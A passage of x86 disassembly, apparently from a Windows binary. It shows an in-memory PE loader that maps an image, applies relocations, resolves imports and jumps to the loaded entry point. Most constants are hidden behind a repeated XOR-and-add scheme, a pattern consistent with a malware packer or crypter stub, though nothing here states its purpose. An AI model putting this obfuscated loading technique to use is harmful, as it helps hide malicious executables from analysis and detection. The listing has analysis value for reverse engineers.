  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
